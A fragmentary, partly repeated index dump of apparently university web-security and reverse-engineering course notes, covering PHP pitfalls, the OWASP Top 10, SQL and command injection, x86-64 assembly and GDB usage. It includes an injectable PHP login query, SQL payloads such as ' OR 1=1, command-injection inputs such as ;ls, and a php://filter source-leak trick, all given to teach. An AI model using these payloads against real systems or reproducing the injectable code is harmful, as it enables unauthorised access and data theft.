function names were shortened/lengthened to make the lookup faster. Other things include: Variables start with $: $name Variable variables: $$name Request-specific dictionaries: $_GET, $_POST, $_SERVER Example <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) { $db = new mysqli('127.0.0.1', 'cs3284', 'cs3284', 'logmein'); $email = $_POST['email']; $password = sha1($_POST['password']); $res = $db->query(\"SELECT * FROM users WHERE email = '$email' AND password = '$password'\"); if ($row = $res->fetch_assoc()) { $_SESSION['id'] = $row['id']; header('Location: index.php'); die(); } } ?> <html>... This example PHP simply checks the POST data for an email and password. If the password is equal to the hashed password in the database, the use is logged in and redirected to the index page. The line email = '$email' uses automatic string interpolation in order to convert $email into a string to compare with the database. Type Juggling PHP will do just about anything to match with a loose comparison (==) which means things can be 'equal' (==) or really equal (===). The implicit integer parsing to strings is the root cause of a lot of issues in PHP. Type Comparison Table Comparisons of $x with PHP Functions Expression gettype() empty() is_null() isset() boolean: if($x) $x = \"\"; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = array('a', 'b'); array FALSE FALSE TRUE TRUE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = \"1\"; string FALSE FALSE TRUE TRUE $x = \"0\"; string TRUE FALSE TRUE FALSE $x = \"-1\"; string FALSE FALSE TRUE TRUE $x = \"php\"; string FALSE FALSE TRUE TRUE $x = \"true\"; string FALSE FALSE TRUE TRUE $x = \"false\"; string FALSE FALSE TRUE TRUE \"==\" Comparisons TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"php\" \"\" TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE 1 TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE FALSE TRUE TRUE -1 TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE \"1\" TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE \"0\" FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE \"-1\" TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE TRUE FALSE TRUE array() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE \"php\" TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE \"===\" Comparisons TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"php\" \"\" TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE \"1\" FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE \"0\" FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE \"-1\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE \"php\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE File Inclusion PHP has multiple ways to include other source files such as require, require_once and include. These can take a dynamic string such as require $_GET['page'] . \".php\"; which is usually seen in templating. PHP Stream Filters PHP has its own URL scheme: php://... and its main purpose is to filter output automatically. It can automatically remove certain HTML tags and can base64 encode as well. Example $fp = fopen('php://output', 'w'); stream_filter_append( $fp, 'string.strip_tags', STREAM_FILTER_WRITE, array('b','i','u')); fwrite($fp, \"<b>bolded text</b> enlarged to a <h1>level 1 heading</h1>\\n\"); /* <b>bolded text</b> enlarged to a level 1 heading */ Exploitation These filters can also be used on input such as: php://filter/convert.base64-encode/resource={file} include , file_get_contents() , etc. support URLs including PHP stream filter URLs ( php:// ) include normally evaluates any PHP code (in tags) it finds, but if it\u2019s base64 encoded it can be used to leak source OWASP Top 10 There are three new categories, four categories with naming and scoping changes, and some consolidation in the Top 10 for 2021. A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category. A02:2021-Cryptographic Failures shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise. A03:2021-Injection slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition. A04:2021-Insecure Design is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to \u201cmove left\u201d as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures. A05:2021-Security Misconfiguration moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it\u2019s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category. A06:2021-Vulnerable and Outdated Components was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores. A07:2021-Identification and Authentication Failures was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping. A08:2021-Software and Data Integrity Failures is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category. A09:2021-Security Logging and Monitoring Failures was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn\u2019t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics. A10:2021-Server-Side Request Forgery is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it\u2019s not illustrated in the data at this time. Exercise (5 pt) Jiaran!!!

But a malicious user might submit different kind of data. For example, consider if the input was ' ? The application would crash because the resulting SQL query is incorrect. SELECT * FROM users WHERE username=''' Notice the extra single quote at the end. With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection. What if our input was ' OR 1=1 ? SELECT * FROM users WHERE username='' OR 1=1 1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying SELECT * FROM users WHERE username='' OR true This will return every row in the table because each row that exists must be true. We can also inject comments and termination characters like -- or /* or ; . This allows you to terminate SQL queries after your injected statements. For example '-- is a common SQL injection payload. SELECT * FROM users WHERE username=''-- ' This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote. Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.","title":"SQL Injection"},{"location":"CS315/Week%205/#command-injection","text":"Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the system() command or its equivalent in the programming language of the application. import os domain = user_input() # ctf101.org os.system('ping ' + domain) The above code when used normally will ping the ctf101.org domain. But consider what would happen if the user_input() function returned different data? import os domain = user_input() # ; ls os.system('ping ' + domain) Because of the additional semicolon, the os.system() function is instructed to run two commands. It looks to the program as: ping ; ls The semicolon terminates a command in bash and allows you to put another command after it. Because the ping command is being terminated and the ls command is being added on, the ls command will be run in addition to the empty ping command! This is the core concept behind command injection. The ls command could of course be switched with another command (e.g. wget, curl, bash, etc.) Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.","title":"Command Injection"},{"location":"CS315/Week%205/#example-payloads","text":";ls $(ls) ls","title":"Example Payloads"},{"location":"CS315/Week%205/#directory-traversal","text":"Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.

A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category. A02:2021-Cryptographic Failures shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise. A03:2021-Injection slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition. A04:2021-Insecure Design is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to \u201cmove left\u201d as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures. A05:2021-Security Misconfiguration moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it\u2019s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category. A06:2021-Vulnerable and Outdated Components was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores. A07:2021-Identification and Authentication Failures was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping. A08:2021-Software and Data Integrity Failures is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category. A09:2021-Security Logging and Monitoring Failures was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn\u2019t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics. A10:2021-Server-Side Request Forgery is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it\u2019s not illustrated in the data at this time.","title":"OWASP Top 10"},{"location":"CS315/Week%205/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%205/#5-pt-jiaran","text":"One of my friends loves Jiaran so, so much.

Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Assembly / Machine Code The C Programming Language Disassemblers Decompilers Assembly/Machine Code Machine Code or Assembly is code which has been formatted for direct execution by a CPU. Machine Code is the why readable programming languages like C, when compiled, cannot be reversed into source code (well Decompilers can sort of, but more on that later). From Source to Compilation Godbolt shows the differences in machine code generated by various compilers. For example, if we have a simple C++ function: #include <unistd.h> #include <stdio.h> #include <stdlib.h> int main() { char c; int fd = syscall(2, \"/etc/passwd\", 0); while (syscall(0, fd, &c, 1)) { putchar(c); } } We can see the compilation results in some verbose instrucitons for the CPU: .LC0: .string \"/etc/passwd\" main: push rbp mov rbp, rsp sub rsp, 16 mov edx, 0 mov esi, OFFSET FLAT:.LC0 mov edi, 2 mov eax, 0 call syscall mov DWORD PTR [rbp-4], eax .L3: lea rdx, [rbp-5] mov eax, DWORD PTR [rbp-4] mov ecx, 1 mov esi, eax mov edi, 0 mov eax, 0 call syscall test rax, rax setne al test al, al je .L2 movzx eax, BYTE PTR [rbp-5] movsx eax, al mov edi, eax call putchar jmp .L3 .L2: mov eax, 0 leave ret This is a one way process for compiled languages as there is no way to generate source from machine code. While the machine code may seem unintelligble, the extremely basic functions can be interpreted with some practice. x86-64 x86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32-bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of diferent things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means diferent instructions can be diferent sizes ranging from 1 to 16 bytes long. And finally x86-64 allows for multi-sized register access which means that you can access certain parts of a register which are diferent sizes. x86-64 Registers x86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access which means the register RAX can have its lower 32 bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL which allows for the compuler to make optimizations which boost program execution. x86-64 has plenty of registers to use including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes. The special registers include: - RIP: the instruction pointer - RSP: the stack pointer - RBP: the base pointer Instructions An instruction represents a single operation for the CPU to perform. There are diferent types of instructions including: Data movement: mov rax, [rsp - 0x40] Arithmetic: add rbx, rcx Control-flow: jne 0x8000400 Because x86-64 is a CISC architecture, instructions can be quite complex for machine code such as repne scasb which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!) It is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP. Note Instructions, numbers, strings, everything! Always represented in hex. add rax, rbx mov rax, 0xdeadbeef mov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de \"Hello\" == 48 65 6c 6c 6f == 48 01 d8 == 48 c7 c0 ef be ad de Execution What should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, run it. Examples mov rax, 0xdeadbeef Here the operation mov is moving the \"immeadiate\" 0xdeadbeef into the register RAX mov rax, [0xdeadbeef + rbx * 4] Here the operation mov is moving the data at the address of [0xdeadbeef + RBX*4] into the register RAX . When brackets are used, you can think of the program as getting the content from that effective address. Example Execution -> 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804000 0x080400a: add, rax, rbx RAX = 0x0 0x080400d: inc rbx RBX = 0x0 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: -> 0x0804005: mov ebx, 0x1234 RIP = 0x0804005 0x080400a: add, rax, rbx RAX = 0xdeadbeef 0x080400d: inc rbx RBX = 0x0 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x080400a -> 0x080400a: add, rax, rbx RAX = 0xdeadbeef 0x080400d: inc rbx RBX = 0x1234 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x080400d 0x080400a: add, rax, rbx RAX = 0xdeadd123 -> 0x080400d: inc rbx RBX = 0x1234 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804010 0x080400a: add, rax, rbx RAX = 0xdeadd123 0x080400d: inc rbx RBX = 0x1235 -> 0x0804010: sub rax, rbx RCX = 0x0 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804013 0x080400a: add, rax, rbx RAX = 0xdeadbeee 0x080400d: inc rbx RBX = 0x1235 0x0804010: sub rax, rbx RCX = 0x0 -> 0x0804013: mov rcx, rax RDX = 0x0 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804005 0x080400a: add, rax, rbx RAX = 0xdeadbeee 0x080400d: inc rbx RBX = 0x1235 0x0804010: sub rax, rbx RCX = 0xdeadbeee 0x0804013: mov rcx, rax RDX = 0x0 Control Flow How can we express conditionals in x86-64? We use conditional jumps such as: jnz <address> je <address> jge <address> jle <address> etc. They jump if their condition is true, and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers which store flags on certain instructions such as add rax, rbx which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a jo instruction. The most important thing to remember is the cmp instruction: cmp rax, rbx jle error This assembly jumps if RAX <= RBX Addresses Memory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier: mov rax, [0xdeadbeef] The square brackets mean \"get the data at this address\". This is analagous to the C/C++ syntax: rax = *0xdeadbeef; The C Programming Language History The C programming language iwas written by Dennis Ritchie in the 1970s while he was working at Bell Labs. It was first used to reimplement the Unix operating system which was purely written in assembly language. At first, the Unix developers were considering using a language called \"B\" but because B wasn't optimized for the target computer, the C language was created. C is the letter and the programming language after B! C was designed to be close to assembly and is still widely used in lower level programming where speed and control are needed (operating systems, embedded systems). C was also very influential to other programming langauges used today. Notable languages include C++, Objective-C, Golang, Java, JavaScript, PHP, Python, and Rust. Hello World C is an ancestor of many other programming languages and if you are familiar with programming, it's likely that C will be at least someewhat familiar. #include <stdio.h> int main() { printf(\"Hello, World!\"); return 0; } Today Today C is widely used either as a low level programming langauge or is the base language that other programming languages are implemented in. While it can be difficult to see, the C language compiles down directly into machine code. The compiler is programmed to process the provided C code and emit assembly that's targetted to whatever operating system and architecture the compiler is set to use. Some common compilers include: gcc clang A good way to explore this relationship is to use this online GCC Explorer from Matt Godbolt. In regards to CTF, many reverse engineering and exploitation CTF challenges are written in C because the language compiles down directly to assembly and there are little to no safeguards in the language. This means developers must manually handle both. Of course, this can lead to mistakes which can sometimes lead to security issues. Other higher level langauges like Python manage memory and garbage collection for you. Google Golang was inspired by C but adds in functionality like garbage collection, and memory safety. There are some examples of famously vulnerable functions in C which are still available and can still result in vulnerabilities: gets - Can result in buffer overflows strcpy - Can result in buffer overflows strcat - Can result in buffer overflows strcmp - Can result in timing attacks Types C has four basic types: char - characters int - integers (e.g. 125) float - 32 bit floating point number (e.g. 2.4) double - 64 bit floating point number (like a float but more precise in terms of decimal points) Pointers C uses an idea known as pointers. A pointer is a variable which contains the address of another variable. To understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses. Take the following example of defining an integer in C: int x = 4; To the programmer this is the variable x receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address 0x1000 now holds the value 4 . The computer knows to directly access the memory and retrieve the value 4 whenever the programmer tries to use the x variable. If we were to say x + 4 , the computer would give you 8 instead of 0x1004 . But in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the & character and using * to create an \"integer pointer\" type. int* y = &x; The y variable will store the address pointed to by the x variable (0x1000). The * character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering *y allows us to access the 4 value instead of 0x1000. Whenever we use the y variable we are using the memory address, but if we use the x variable we use the value stored at the memory address. Arrays Arrays are a grouping of objects of the same type. They are typically created with the following syntax: type arrayName [ arraySize ]; To initialize values in the array we can do: int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; Arrays allow programmers to group data into logical containers. To access the indiviual elements of an array we access the contents by their \"index\". Most programming langauges today start counting from 0. So to take our previous example: int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; /* indexes 0 1 2 3 4 5 6 7 8 9 To access the value 6 we would use index 5: integers[5]; How do arrays work? Arrays are a clever combination of multiplication, pointers, and programming. Because the computer knows the data type used for every element in the array, the computer needs to simply multiply the size of the data type by the index you are looking for and then add this value to the address of the beginning of the array. For example if we know that the base address of an array is 1000 and we know that each integer takes 8 bytes, we know that if we have 8 integers right next to each other, we can get the integer at the 4th index with the following math: 1000 + (4 * 8) = 1032 array [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] index 0 1 2 3 4 5 6 7 addrs 1000 1008 1016 1024 1032 1040 1048 1056 Disassemblers A disassembler is a tool which breaks down a compiled program into machine code. List of Disassemblers IDA Binary Ninja GNU Debugger (GDB) radare2 Hopper IDA The Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry leading Hex Rays decompiler which can convert assembly code back into a pseudo code like format. IDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier: https://github.com/google/binnavi https://github.com/yegord/snowman https://github.com/gaasedelen/lighthouse https://github.com/joxeankoret/diaphora https://github.com/REhints/HexRaysCodeXplorer https://github.com/osirislab/Fentanyl Binary Ninja Binary Ninja is an up and coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers. Binja also has some community contributed plugins which are collected here: https://github.com/Vector35/community-plugins gdb The GNU Debugger is a free and open source debugger which also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabailities. gdb is often used in tandom with enhancement scripts like peda , pwndbg , and GEF The GNU Debugger (GDB) The GNU Debugger or GDB is a powerful debugger which allows for step-by-step execution of a program. It can be used to trace program execution and is an important part of any reverse engineering toolkit. Vanilla GDB GDB without any modifications is unintuitive and obscures a lot of useful information. The plug-in pwndb solves a lot of these problems and makes for a much more pleasant experience. But if you are constrained and have to use vanilla gdb, here are several things to make your life easier. Starting GDB To execute GBD and attach it to a program simply run gdb [program] Disassembly (gdb) disassemble [address/symbol] will display the disassembly for that function/frame GDB will autocomplete functions, so saying (gdb) disas main suffices if you'd like to see the disassembly of main View Disassembly During Execution Another handy thing to see while stepping through a program is the disassembly of nearby instructions: (gdb) display/[# of instructions]i $pc [\u00b1 offset] display shows data with each step /[#]i shows how much data in the format i for instruction $pc means the pc, program counter, register [\u00b1 offset] allows you to specify how you would like the data offset from the current instruction Example Usage (gdb) display/10i $pc - 0x5 This command will show 10 instructions on screen with an offset from the next instruction of 5, giving us this display: 0x8048535 <main+6>: lock pushl -0x4(%ecx) 0x8048539 <main+10>: push %ebp => 0x804853a <main+11>: mov %esp,%ebp 0x804853c <main+13>: push %ecx 0x804853d <main+14>: sub $0x14,%esp 0x8048540 <main+17>: sub $0xc,%esp 0x8048543 <main+20>: push $0x400 0x8048548 <main+25>: call 0x80483a0 <malloc@plt> 0x804854d <main+30>: add $0x10,%esp 0x8048550 <main+33>: sub $0xc,%esp Deleting Views If for whatever reason, a view no long suits your needs simply call (gdb) info display which will give you a list of active displays: Auto-display expressions now in effect: Num Enb Expression 1: y /10bi $pc-0x5 Then simply execute (gdb) delete display 1 and your execution will resume without the display. Registers In order to view the state of registers with vanilla gdb, you need to run the command info registers which will display the state of all the registers: eax 0xf77a6ddc -142971428 ecx 0xffe06b10 -2069744 edx 0xffe06b34 -2069708 ebx 0x0 0 esp 0xffe06af8 0xffe06af8 ebp 0x0 0x0 esi 0xf77a5000 -142979072 edi 0xf77a5000 -142979072 eip 0x804853a 0x804853a <main+11> eflags 0x286 [ PF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 If you simply would like to see the contents of a single register, the notation x/x $[register] where: x/x means display the address in hex notation $[register] is the register code such as eax, rax, etc. Pwndbg These commands work with vanilla gdb as well. Setting Breakpoints Setting breakpoints in GDB uses the format b*[Address/Symbol] Example Usage (gdb) b*main : Break at the start (gdb) b*0x804854d : Break at 0x804854d (gdb) b*0x804854d-0x100 : Break at 0x804844d Deleting Breakpoints As before, in order to delete a view, you can list the available breakpoints using (gdb) info breakpoints (don't forget about GDB's autocomplete, you don't always need to type out every command!) which will display all breakpoints: Num Type Disp Enb Address What 1 breakpoint keep y 0x0804852f <main> 3 breakpoint keep y 0x0804864d <__libc_csu_init+61> Then simply execute (gdb) delete 1 Note GDB creates breakpoints chronologically and does NOT reuse numbers. Stepping What good is a debugger if you can't control where you are going? In order to begin execution of a program, use the command r [arguments] similar to how if you ran it with dot-slash notation you would execute it ./program [arguments] . In this case the program will run normally and if no breakpoints are set, you will execute normally. If you have breakpoints set, you will stop at that instruction. (gdb) continue [# of breakpoints] : Resumes the execution of the program until it finishes or until another breakpoint is hit (shorthand c ) (gdb) step[# of instructions] : Steps into an instruction the specified number of times, default is 1 (shorthand s ) (gdb) next instruction [# of instructions] : Steps over an instruction meaning it will not delve into called functions (shorthand ni ) (gdb) finish : Finishes a function and breaks after it gets returned (shorthand fin ) Examining Examining data in GDB is also very useful for seeing how the program is affecting data. The notation may seem complex at first, but it is flexible and provides powerful functionality. (gdb) x/[#][size][format] [Address/Symbol/Register][\u00b1 offset] x/ means examine [#] means how much [size] means what size the data should be such as a word w (2 bytes), double word d (4 bytes), or giant word g (8 bytes) [format] means how the data should be interpreted such as an instruction i , a string s , hex bytes x [Address/Symbol][\u00b1 offset] means where to start interpreting the data Example Usage (gdb) x/x $rax : Displays the content of the register RAX as hex bytes (gdb) x/i 0xdeadbeef : Displays the instruction at address 0xdeadbeef (gdb) x/10s 0x893e10 : Displays 10 strings at the address (gdb) x/10gx 0x7fe10 : Displays 10 giant words as hex at the address Forking If the program happens to be an accept-and-fork server, gdb will have issues following the child or parent processes. In order to specify how you want gdb to function you can use the command set follow-fork-mode [on/off] Setting Data If you would like to set data at any point, it is possible using the command set [Address/Register]=[Hex Data] Example Usage set $rax=0x0 : Sets the register rax to 0 set 0x1e4a70=0x123 : Sets the data at 0x1e4a70 to 0x123 Process Mapping A handy way to find the process's mapped address spaces is to use info proc map : Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /directory/program 0x8049000 0x804a000 0x1000 0x0 /directory/program 0x804a000 0x804b000 0x1000 0x1000 /directory/program 0xf75cb000 0xf75cc000 0x1000 0x0 0xf75cc000 0xf7779000 0x1ad000 0x0 /lib32/libc-2.23.so 0xf7779000 0xf777b000 0x2000 0x1ac000 /lib32/libc-2.23.so 0xf777b000 0xf777c000 0x1000 0x1ae000 /lib32/libc-2.23.so 0xf777c000 0xf7780000 0x4000 0x0 0xf778b000 0xf778d000 0x2000 0x0 [vvar] 0xf778d000 0xf778f000 0x2000 0x0 [vdso] 0xf778f000 0xf77b1000 0x22000 0x0 /lib32/ld-2.23.so 0xf77b1000 0xf77b2000 0x1000 0x0 0xf77b2000 0xf77b3000 0x1000 0x22000 /lib32/ld-2.23.so 0xf77b3000 0xf77b4000 0x1000 0x23000 /lib32/ld-2.23.so 0xffc59000 0xffc7a000 0x21000 0x0 [stack] This will show you where the stack, heap (if there is one), and libc are located. Attaching Processes Another useful feature of GDB is to attach to processes which are already running. Simply launch gdb using gdb , then find the process id of the program you would like to attach to an execute attach [pid] . Decompilers Decompilers do the impossible and reverse compiled code back into psuedocode/code. IDA offers HexRays, which translates machine code into a higher language pseudocode. Example Workflow Let's say we are disassembling a program which has the source code: #include <stdio.h> void printSpacer(int num){ for(int i = 0; i < num; ++i){ printf(\"-\"); } printf(\"\\n\"); } int main() { char* string = \"Hello, World!\"; for(int i = 0; i < 13; ++i){ printf(\"%c\", string[i]); for(int j = i+1; j < 13; j++){ printf(\"%c\", string[j]); } printf(\"\\n\"); printSpacer(13 - i); } return 0; } And creates an output of: Hello, World! ------------- ello, World! ------------ llo, World! ----------- lo, World! ---------- o, World! --------- , World! -------- World! ------- World! ------ orld! ----- rld! ---- ld! --- d! -- ! - If we are given a binary compiled from that source and we want to figure out how the source looks, we can use a decompiler to get c pseudocode which we can then use to reconstruct the function. The sample decompilation can look like: printSpacer: int __fastcall printSpacer(int a1) { int i; // [rsp+8h] [rbp-8h] for ( i = 0; i < a1; ++i ) printf(\"-\"); return printf(\"\\n\"); } main: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+18h] [rbp-18h] signed int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; i < 13; ++i ) { v4 = i + 1; printf(\"%c\", (unsigned int)aHelloWorld[i], envp); while ( v4 < 13 ) printf(\"%c\", (unsigned int)aHelloWorld[v4++]); printf(\"\\n\"); printSpacer(13 - i); } return 0; } A good method of getting a good representation of the source is to convert the decompilation into Python since Python is basically psuedocode that runs. Starting with main often allows you to gain a good overview of what the program is doing and will help you translate the other functions. Main We know we will start with a main function and some variables, if you trace the execution of the variables, you can oftentimes determine the variable type. Because i is being used as an index, we know its an int, and because v4 used as one later on, it too is an index. We can also see that we have a variable aHelloWorld being 